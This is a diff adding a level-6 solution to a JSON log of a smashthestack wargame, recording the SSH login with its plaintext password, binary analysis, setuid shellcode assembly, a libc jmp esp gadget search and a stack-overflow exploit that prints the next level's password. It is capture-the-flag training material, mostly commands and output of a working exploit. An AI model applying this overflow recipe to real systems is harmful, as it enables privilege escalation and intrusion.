@@ -208,6 +208,104 @@
     }
    ],
    "note": "Environment-based strcpy overflow via VULN. Same shellcode/probe recipe as L4. Verified live 2026-11-25."
+  },
+  {
+   "lvl": 6,
+   "user": "level6",
+   "pw": "ur_so_l33t",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level6@blowfish.smashthestack.org",
+     "out": [
+      "level6@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "whoami",
+     "out": [
+      "level6"
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      "This level is another stack overflow in /levels/level6",
+      "Exploit it and move to the next level. "
+     ]
+    },
+    {
+     "cmd": "cat /levels/level6.c",
+     "out": [
+      "snprintf(buffer1,sizeof(buffer1),\"%s\",string1);",
+      "if(strlen(string2)>=sizeof(buffer2)*3) { overflow detected }",
+      "snprintf(buffer2,sizeof(buffer1)*3,\"%s\",string2);",
+      "badfunc(argv[2], argv[1]);"
+     ]
+    },
+    {
+     "cmd": "objdump -d --no-show-raw-insn /levels/level6 | sed -n '/<badfunc>:/,/ret/p'",
+     "out": [
+      "buffer1 = ebp-0x408 (snprintf 0x400 from 0x8(%ebp) = argv[2])",
+      "buffer2 = ebp-0x808 (snprintf 0xc00 from 0xc(%ebp) = argv[1])",
+      "ret = buffer2+2060"
+     ]
+    },
+    {
+     "cmd": "cat /proc/sys/kernel/randomize_va_space",
+     "out": [
+      "0"
+     ]
+    },
+    {
+     "cmd": "ldd /levels/level6 | head -3",
+     "out": [
+      "libc.so.6 => /lib/libc.so.6 (0xb7e9d000)",
+      "(ASLR off -> fixed libc base)"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/l6bf.asm",
+     "out": [
+      "(55-byte NUL-free setuid shellcode)",
+      "[New] written"
+     ]
+    },
+    {
+     "cmd": "nasm -f elf32 /dev/shm/l6bf.asm -o /dev/shm/l6bf.o && objcopy -O binary --only-section=.text /dev/shm/l6bf.o /dev/shm/l6bf.bin && xxd -p /dev/shm/l6bf.bin && wc -c /dev/shm/l6bf.bin",
+     "out": [
+      "31c0b0c9cd8089c3...bcd80",
+      "55 /dev/shm/l6bf.bin"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/findjmp.py",
+     "out": [
+      "(scan libc-2.7.so for \\xff\\xe4 jmp esp; base 0xb7e9d000)",
+      "[New] written"
+     ]
+    },
+    {
+     "cmd": "python /dev/shm/findjmp.py",
+     "out": [
+      "first jmp esp at 0xb7e9f991"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/e_bf6.py",
+     "out": [
+      "(argv[1] = A*2060 + jmp_esp + sled + shellcode; pipe-fed id + cat /pass/level7)",
+      "[New] 37L, 1132C written"
+     ]
+    },
+    {
+     "cmd": "python /dev/shm/e_bf6.py",
+     "out": [
+      "uid=1007(level7) gid=1006(level6) groups=1006(level6)",
+      "g00d_j0b"
+     ]
+    }
+   ],
+   "note": "snprintf buffer2 overflow (ret at buffer2+2060); libc jmp esp gadget (ASLR off) removes address guessing. badfunc takes (argv[2], argv[1]) - the overflow travels in argv[1]. Verified live 2026-11-25."
   }
  ],
  "goals": {}
